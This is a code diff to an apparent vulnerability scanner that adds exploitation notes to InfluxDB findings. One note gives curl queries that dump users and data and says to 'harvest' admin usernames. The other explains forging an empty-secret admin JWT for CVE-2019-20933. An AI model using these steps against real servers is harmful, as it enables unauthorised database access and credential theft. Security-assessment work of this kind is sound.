@@ -199,7 +199,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl -s -G '{base}/query' --data-urlencode 'q=SHOW DATABASES' ; "
                     f"# then SHOW USERS ; SELECT * FROM <db>..<measurement> LIMIT 10",
                     "Set auth-enabled=true, create an admin, firewall 8086.",
-                    ["CWE-306", "CWE-287"], kind="influxdb_unauth"))
+                    ["CWE-306", "CWE-287"], kind="influxdb_unauth",
+                    exploit_note=(
+                        "curl -s -G 'http://<ip>:<port>/query' "
+                        "--data-urlencode 'q=SHOW USERS' ; --data-urlencode "
+                        "'q=SELECT * FROM <db>..<measurement> LIMIT 20' ; harvest "
+                        "hostnames + admin usernames."),
+                    depth_tier="t2"))
             if ver and _jwt_bypass(ver):
                 out.append(_finding(
                     "high", "InfluxDB < 1.7.6 - JWT auth bypass (CVE-2019-20933)", tgt,
@@ -211,7 +217,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"curl -s -G '{base}/query' -H 'Authorization: Bearer <jwt>' "
                     f"--data-urlencode 'q=SHOW DATABASES'",
                     "Upgrade to InfluxDB 1.7.6+ and configure a strong shared secret.",
-                    ["CWE-287"], kind="influxdb_jwt_bypass"))
+                    ["CWE-287"], kind="influxdb_jwt_bypass",
+                    exploit_note=(
+                        "Forge an HS256 JWT with an empty secret and "
+                        "{\"username\":\"admin\",\"exp\":<future>} via stdlib "
+                        "hmac+base64url, then: curl -H 'Authorization: Bearer "
+                        "<jwt>' 'http://<ip>:<port>/query?q=SHOW+DATABASES' - a 200 "
+                        "confirms the bypass."),
+                    depth_tier="t0"))
     return out
 
 
